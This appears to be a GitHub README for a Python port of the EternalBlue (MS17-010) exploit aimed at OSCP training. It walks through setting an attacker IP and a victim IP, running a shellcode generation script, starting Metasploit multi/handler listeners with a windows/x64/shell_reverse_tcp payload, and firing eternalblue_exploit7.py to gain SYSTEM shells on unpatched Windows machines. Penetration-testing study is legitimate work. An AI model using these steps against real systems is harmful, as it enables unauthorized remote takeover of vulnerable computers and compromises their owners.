# MS17-010

## Intro
This repository is forked from the fantastic work by [Worawit](https://github.com/worawit/MS17-010/) on the NSA's exploit leaked by the ShadowBrokers.

This is a python port of the exploit and has an excellent reliability for exploiting Windows OS that are vulnerable to [MS17-010/EternalBlue](http://www.wired.co.uk/article/what-is-eternal-blue-exploit-vulnerability-patch).
use the checker.py script to see if the target is unpatched/vulnerable.

Worawits script is great but its not so simple or quick to compile and has many moving parts to get up and running. 
It is necessary to work with raw Assembly language, shellcode for multiple architectures, msfconsole etc. 

What I have created a very handy bash script which will do all of the hard work for you and also gives instructions on how to exploit.

## Why create this ?
Because knowing how the exploit works is a lot more fun that firing up metasploit as well as that I created this out of necessity for the [PWK course](https://www.offensive-security.com/information-security-training/penetration-testing-training-kali-linux/) and the [OSCP certification](https://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/)  . Those of you undertaking either will be well aware of the fact that Metasploit is extremely limited during exam time, so this 
exploit offers you a very fast reliable and allowed way to exploit any targets with port 445,139 open that are vulnerable.

My generation script will output 2 files that can be read into msfconsole by using the -r flag (msfconsole -r /root/EternalBlueX64.rc), so you dont have to keep typing out 
```
use exploit/multi/handler
set PAYLOAD windows/x64/shell_reverse_tcp
set EXITFUNC thread
set ExitOnSession false
set LHOST 192.168.*.**
set LPORT 5555
exploit -j
```

# Reliability
Its very reliable, I have not come across an unpatched Windows 7 PC that it has not worked against (in PWK and personal Lab environment).
If the system is vulnerable and it does not work the first time around keep trying.. or take a break and regenerate the shellcode again and again, eventually you will own the computer and have full **nt authority\system** rights on the pwned system.


# Use



To get up and running theres 2 things you need to do, open up the start.sh file and add you own ip as the **attackerIP** and the victim OS IP in **vulnerableIP** you can optionally change the port numbers that msfconsole will listen on but generally you can leave them as is.
```
# change these values to your attacking IP and 2 ports for 32bit/64bit Architecture
attackerIP=192.168.2.133 # put your ip here*
vulnerableIP=192.168.2.253  # put the victim ip here*
arch_x86_port=4444  # x86 msfconsole multi handler port (optional change)
arch_x64_port=5555 # x64 msfconsole multi handler port (optional change)
```

fire up  the script and just follow the on screen instructions after the 7 step generation process. 

```
./start.sh
```

You will then need to copy 3 lines from the output 1 is the actual execution of the python **eternalblue_exploit7.py** exploit and the other 2 are the msfconsole helpers to start up 2 exploit/multi/handlers.. something similar to the following but youll see your specific commands in the output.

```
msfconsole -r "/root/MS17-010/output/EternalBlueX64.rc"
msfconsole -r "/root/MS17-010/output/EternalBlueX86.rc"
python /root/MS17-010/eternalblue_exploit7.py 192.168.*.** /root/MS17-010/bin/sc_all.bin 3
```


# Disclaimer
Do not use this on systems unless you have been given explicit permission. 
This is created for use in the PWK labs and OSCP exam lab. 
It may have unpreceedented consequenses both legally and ethically if used inappropriately. 
This is a POC script and I bare no responsibility for its use by others.
